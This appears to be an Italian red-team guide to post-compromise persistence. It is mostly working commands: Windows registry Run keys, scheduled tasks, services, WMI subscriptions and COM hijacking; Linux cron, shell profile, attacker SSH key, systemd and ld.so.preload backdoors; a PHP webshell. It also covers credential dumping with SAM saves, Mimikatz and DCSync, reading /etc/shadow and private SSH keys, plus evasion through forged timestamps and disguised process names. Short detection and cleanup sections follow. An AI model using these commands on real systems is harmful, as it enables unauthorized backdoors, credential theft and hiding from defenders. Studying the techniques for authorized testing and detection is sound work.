# Persistence

## Scopo

Questa guida copre tecniche di persistenza su sistemi Windows e Linux, utilizzate durante red team engagement per mantenere accesso dopo compromissione iniziale.

## Prerequisiti

- Accesso al sistema target
- Privilegi appropriati (user/admin)
- Conoscenza OS internals
- **Autorizzazione esplicita**

---

## Windows Persistence

### Registry Run Keys

```powershell
# User level (no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\user\update.exe"

# Machine level (admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\update.exe"

# RunOnce
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Updater /t REG_SZ /d "C:\payload.exe"
```

### Scheduled Tasks

```powershell
# Create task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# Daily task
schtasks /create /tn "Maintenance" /tr "C:\payload.exe" /sc daily /st 09:00

# On startup
schtasks /create /tn "Startup" /tr "C:\payload.exe" /sc onstart /ru SYSTEM
```

### Services

```powershell
# Create service
sc create "WindowsUpdater" binpath= "C:\payload.exe" start= auto

# Configure
sc config "WindowsUpdater" start= auto

# Start
sc start "WindowsUpdater"

# PowerShell
New-Service -Name "WindowsUpdater" -BinaryPathName "C:\payload.exe" -StartupType Automatic
```

### Startup Folder

```powershell
# User startup
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users (admin)
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### WMI Event Subscription

```powershell
# Richiede PowerShell
$FilterArgs = @{name='PersistFilter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"};
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='PersistConsumer';CommandLineTemplate="C:\payload.exe"};
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$BindingArgs = @{Filter = [Ref]$Filter;Consumer = [Ref]$Consumer};
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs
```

### DLL Hijacking

```powershell
# Trova DLL mancanti
procmon.exe  # Filter: Result = NAME NOT FOUND, Path ends with .dll

# Posiziona DLL malevola in path prima dell'originale
```

### COM Hijacking

```powershell
# Modifica CLSID in registry
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\malicious.dll"
```

---

## Linux Persistence

### Crontab

```bash
# User crontab
(crontab -l ; echo "*/5 * * * * /tmp/payload.sh") | crontab -

# System crontab (root)
echo "*/5 * * * * root /tmp/payload.sh" >> /etc/crontab

# Cron directories
echo "#!/bin/bash\n/tmp/payload.sh" > /etc/cron.d/update
chmod 755 /etc/cron.d/update
```

### Bashrc / Profile

```bash
# User bashrc
echo "/tmp/payload.sh &" >> ~/.bashrc

# System-wide
echo "/tmp/payload.sh &" >> /etc/profile

# Bash profile
echo "/tmp/payload.sh &" >> ~/.bash_profile
```

### SSH Keys

```bash
# Aggiungi authorized_key
echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys

# Per root
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

### Systemd Service

```bash
# Crea service file
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/tmp/payload
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable
systemctl enable update.service
systemctl start update.service
```

### Init.d

```bash
# Script in init.d
cat > /etc/init.d/update << EOF
#!/bin/bash
/tmp/payload.sh &
EOF

chmod +x /etc/init.d/update
update-rc.d update defaults
```

### rc.local

```bash
# Aggiungi a rc.local
echo "/tmp/payload.sh &" >> /etc/rc.local
chmod +x /etc/rc.local
```

### LD_PRELOAD

```bash
# Crea shared library malevola
# Imposta in environment
echo "/path/to/malicious.so" > /etc/ld.so.preload
```

### PAM Backdoor

```bash
# Modifica PAM per accettare password universale
# Richiede compilazione modulo custom PAM
```

---

## Web Persistence

### Webshell

```bash
# PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.hidden.php

# ASP
# Nascondi in directory legittime
```

### Modifiche Applicazione

```bash
# Aggiungi user admin in DB
# Modifica autenticazione
# Backdoor in codice sorgente
```

---

## Credential Access

### Windows

```powershell
# Dump SAM (admin)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# DCSync (domain admin)
mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

### Linux

```bash
# Shadow file (root)
cat /etc/shadow

# SSH keys
cat /home/*/.ssh/id_rsa
```

---

## Evasion

### Timestamps

```bash
# Linux - preserve timestamps
touch -r /bin/ls /tmp/payload

# Windows
(Get-Item C:\payload.exe).LastWriteTime = (Get-Item C:\Windows\System32\cmd.exe).LastWriteTime
```

### Hidden Files

```bash
# Linux
mv payload.sh .payload.sh

# Windows
attrib +h +s C:\payload.exe
```

### Process Names

```bash
# Linux - Rename processo
exec -a "[kworker/0:0]" /tmp/payload

# Windows - process hollowing
```

---

## Detection

### Windows

```powershell
# Autoruns
autorunsc.exe -a * -s -h

# Scheduled tasks
schtasks /query /fo LIST /v

# Services
sc query type= service state= all

# Registry
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

### Linux

```bash
# Crontabs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Services
systemctl list-units --type=service

# Startup
cat /etc/rc.local
ls -la /etc/init.d/

# SSH keys
cat ~/.ssh/authorized_keys
```

---

## Cleanup

```bash
# Rimuovi tutti i meccanismi creati
# Registry keys
# Scheduled tasks
# Services
# Crontabs
# SSH keys
# Files

# Documenta tutto per report finale
```

---

## Best Practices

- **Document**: Log ogni modifica
- **Minimal**: Solo persistence necessaria
- **Scope**: Rispetta boundaries
- **Cleanup**: Piano di rimozione
- **Detection**: Considera visibilit√†

## Riferimenti

- [MITRE ATT&CK Persistence](https://attack.mitre.org/tactics/TA0003/)
- [PayloadsAllTheThings - Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Persistence)
- [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)
